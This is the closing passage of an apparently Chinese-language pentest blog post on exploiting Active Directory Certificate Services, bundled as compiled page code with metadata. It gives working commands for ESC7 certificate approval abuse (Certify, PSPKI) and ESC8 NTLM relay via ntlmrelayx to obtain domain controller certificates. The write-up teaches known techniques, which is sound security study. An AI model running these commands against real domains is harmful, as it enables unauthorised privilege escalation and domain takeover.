src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108215753702.png" alt="image-20240108215753702" tabindex="0" loading="lazy"><figcaption>image-20240108215753702</figcaption></figure><p>之后的流程就和ESC6相同了</p></li><li><p>ManageCertificates</p><p>拥有该权限，能够对需要管理员审批的证书申请进行审批。</p><p>如果当前用户拥有该权限，只需要记住请求的ID，即可</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Certify.exe request /ca:ECHANGE2013.loser.com\\loser-DC-CA /template:ApprovalNeeded</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Import-Module PSPKI</span></span>
<span class="line"><span>Get-CertificationAuthority -ComputerName ECHANGE2013.loser.com | Get-PendingRequest -RequestID 20 | Approve-CertificateRequest</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Certify.exe download /ca:ECHANGE2013.loser.com\\loser-DC-CA /id:20</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108222020525.png" alt="image-20240108222020525" tabindex="0" loading="lazy"><figcaption>image-20240108222020525</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108222239700.png" alt="image-20240108222239700" tabindex="0" loading="lazy"><figcaption>image-20240108222239700</figcaption></figure></li></ul><h3 id="esc8-ntlm-relay-to-ad-cs-http-endpoints" tabindex="-1"><a class="header-anchor" href="#esc8-ntlm-relay-to-ad-cs-http-endpoints"><span>ESC8(NTLM Relay to AD CS HTTP Endpoints)</span></a></h3><p>在安装AD CS服务时，如果勾选了web注册服务，就能利用这点进行NTLM Relay</p><ul><li>默认情况下web注册界面仅支持http,明确表明是通过ntlm进行验证。证书注册服务（CES）、证书注册策略（CEP）Web 服务和网络设备注册服务（NDES）默认支持通过其授权 HTTP 标头协商身份验证，协商身份验证支持 Kerberos 和 NTLM。同时这些服务支持https,但https在不与通道绑定结合时是不能防止ntlm relay的</li></ul><blockquote><p>关于为什么要relay到web界面？</p><p>通常ntlm relay只能进行一次身份验证。这导致会话的时间过短。此外，身份验证会话受到限制，攻击者无法与强制执行 NTLM 签名的服务交互。</p><p>如果是relay到web界面。攻击者可以访问web界面并为受害者申请证书，从而持续获取ntlm hash或者用于kerberos认证。这将获得一个较长时间的会话。</p></blockquote><p>impacket里面的套件已经有了实现</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>python3 ntlmrelayx.py -t http://192.168.30.88/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</span></span>
<span class="line"><span></span></span>
<span class="line"><span># --adcs 启用 AD CS Relay 攻击</span></span>
<span class="line"><span># --template指定 AD CS 证书模板</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,90)]))}const d=e(n,[["render",l],["__file","AD_CS漏洞利用.html.vue"]]),g=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/AD%20CS%E4%B8%93%E9%A2%98/AD_CS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.html","title":"ADCS漏洞利用","lang":"zh-CN","frontmatter":{"description":"ADCS漏洞利用 前言 这一篇主要看下ADCS漏洞的利用，包括但不限于证书滥用，维权，提权等。内容主要还是基于白皮书以及网络上收集到的一些文章 证书申请 在上一篇我们讲到我们的机器如果在域内可以通过certmgr.msc 或通过 certreq.exe来进行证书的申请，但那实在是比较理想的情况，我们不一定能拥有对机器的GUI权限，因此在通过命令行进行证...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/AD%20CS%E4%B8%93%E9%A2%98/AD_CS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"ADCS漏洞利用"}],["meta",{"property":"og:description","content":"ADCS漏洞利用 前言 这一篇主要看下ADCS漏洞的利用，包括但不限于证书滥用，维权，提权等。内容主要还是基于白皮书以及网络上收集到的一些文章 证书申请 在上一篇我们讲到我们的机器如果在域内可以通过certmgr.msc 或通过 certreq.exe来进行证书的申请，但那实在是比较理想的情况，我们不一定能拥有对机器的GUI权限，因此在通过命令行进行证..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20231228204328718.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"ADCS漏洞利用\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20231228204328718.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20231228205333908.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20231228212214658.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240102201952926.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104141943425.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/屏幕截图 2024-01-04 143655.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104144810306.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104145739899.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104160132560.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104160154104.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104160209178.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104161109991.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104161159955.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104205624548.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104210937632.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240105164400145.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240105170924555.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108161144609.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108161630768.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108162348796.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108215753702.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108222020525.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108222239700.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"前言","slug":"前言","link":"#前言","children":[]},{"level":2,"title":"证书申请","slug":"证书申请","link":"#证书申请","children":[]},{"level":2,"title":"域权限提升","slug":"域权限提升","link":"#域权限提升","children":[{"level":3,"title":"场景一","slug":"场景一","link":"#场景一","children":[]},{"level":3,"title":"场景二","slug":"场景二","link":"#场景二","children":[]},{"level":3,"title":"场景三","slug":"场景三","link":"#场景三","children":[]},{"level":3,"title":"证书模板访问控制级别配置错误(ESC4)","slug":"证书模板访问控制级别配置错误-esc4","link":"#证书模板访问控制级别配置错误-esc4","children":[]},{"level":3,"title":"PKI缺陷(ESC5)","slug":"pki缺陷-esc5","link":"#pki缺陷-esc5","children":[]},{"level":3,"title":"ESC6","slug":"esc6","link":"#esc6","children":[]},{"level":3,"title":"ESC7(CA访问权限配置错误)","slug":"esc7-ca访问权限配置错误","link":"#esc7-ca访问权限配置错误","children":[]},{"level":3,"title":"ESC8(NTLM Relay to AD CS HTTP Endpoints)","slug":"esc8-ntlm-relay-to-ad-cs-http-endpoints","link":"#esc8-ntlm-relay-to-ad-cs-http-endpoints","children":[]}]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":8.92,"words":2676},"filePathRelative":"渗透测试/AD CS专题/AD_CS漏洞利用.md","localizedDate":"2025年1月16日","excerpt":"\\n<h2>前言</h2>\\n<p>这一篇主要看下ADCS漏洞的利用，包括但不限于证书滥用，维权，提权等。内容主要还是基于白皮书以及网络上收集到的一些文章</p>\\n<h2>证书申请</h2>\\n<p>在上一篇我们讲到我们的机器如果在域内可以通过<code>certmgr.msc</code> 或通过 <code>certreq.exe</code>来进行证书的申请，但那实在是比较理想的情况，我们不一定能拥有对机器的GUI权限，因此在通过命令行进行证书申请时，我们可以使用白皮书配套的证书工具<a href=\\"https://github.com/GhostPack/Certify\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">Certify</a></p>","autoDesc":true}');export{d as comp,g as data};
